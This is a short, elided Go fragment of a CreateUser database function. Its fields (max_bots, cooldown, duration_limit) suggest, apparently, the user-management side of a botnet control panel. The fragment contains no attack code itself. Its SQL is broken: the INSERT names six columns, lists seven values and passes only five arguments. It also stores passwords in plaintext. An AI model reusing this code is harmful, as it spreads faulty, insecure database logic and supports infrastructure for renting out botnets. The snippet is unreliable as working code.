...
func (this *Database) CreateUser(username string, password string, max_bots int, duration int, cooldown int) bool {
    ...
    this.db.Exec("INSERT INTO users (username, password, max_bots, last_paid, cooldown, duration_limit) VALUES (?, ?, ?, ?, UNIX_TIMESTAMP(), ?, ?)", username, password, max_bots, cooldown, duration)
    return true
}
